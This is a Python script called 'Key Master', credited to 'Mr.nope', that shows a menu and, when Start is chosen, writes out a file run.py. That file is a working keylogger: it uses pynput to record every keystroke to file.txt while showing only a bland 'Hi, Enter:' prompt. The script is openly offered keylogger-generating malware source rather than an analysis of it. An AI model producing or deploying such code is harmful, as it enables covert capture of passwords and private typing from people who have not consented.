#!/usr/bin/python3
# This code write by Mr.nope
import os
import time
import sys
try:
    from pynput.keyboard import Listener
except ImportError:
    os.system("pip3 install pynput")
class color:
     green = '\033[92m'
     red = '\033[91m'
     blue = '\033[96m'
     End = '\033[0m'
     line = '\033[4m'
     org = '\033[33m'
     prl = '\033[98m'
opt = "\nKey-Master/> "
def title():
    os.system("printf '\033]2;Key Master\a'")
def cls():
    os.system("clear")
def menu():
    title()
    cls()
    banner()
    list()
def banner():
    print(color.blue + """
                                    _            
  /\ /\___ _   _    /\/\   __ _ ___| |_ ___ _ __ 
 / //_/ _ \ | | |  /    \ / _` / __| __/ _ \ '__|
/ __ \  __/ |_| | / /\/\ \ (_| \__ \ ||  __/ |   """ + color.red + " Version: " + color.green + "1.3.0" + color.blue + """
\/  \/\___|\__, | \/    \/\__,_|___/\__\___|_|   
           |___/                                 """ + color.org + """
  This code write by """ + color.line + "Mr.nope" + color.End)
def list():
    print("\n{1}-Start")
    print("{2}-Developer")
    print("{3}-Exit")
    choose = input(opt)
    if choose == '1':
      print("\nCreating...")
      time.sleep(2)
      a = open("run.py","w")
      a.write("""
# This code write by Mr.nope

from pynput.keyboard import Listener

def start(key):
    a = open("file.txt","a")
    a.write(str(key))
    a.close()
try:
   print("Hi, Enter:")
   logger = Listener(on_press = start)
   logger.start()
   while True:
        pass
except KeyboardInterrupt:
    print("Exiting...")""")
      a.close()
      print("Finish...!")
      sys.exit()
    elif choose == '2':
        cls()
        os.system("figlet -f slant Key Master|lolcat")
        print(color.red + "\nThis Programm write by " + color.green + "Mr.nope" + color.End)
        print(color.org + "\nVersion: " + color.blue + "1.3.0" + color.End)
        print(color.prl + "\nGithub: " + color.line + "https://github.com/mrprogrammer2938" + color.End)
        time.sleep(1)
        try1()
    elif choose == '3':
        cls()
        print(color.green + "Exiting..." + color.End)
        sys.exit()
    elif choose == '':
        menu()
    elif choose == ' ':
        menu()
    else:
        cls()
        print(choose + color.red + " Not Found!" + color.End)
        try1()
def try1():
    try_to_backmenu = input("\npress Enter...")
    if try_to_backmenu == '':
      menu()
    else:
        menu() 
if __name__ == '__main__':
  try: 
     menu()
  except KeyboardInterrupt:
      print("\nCtrl + C")
      print("\nExiting...")
      sys.exit()
    
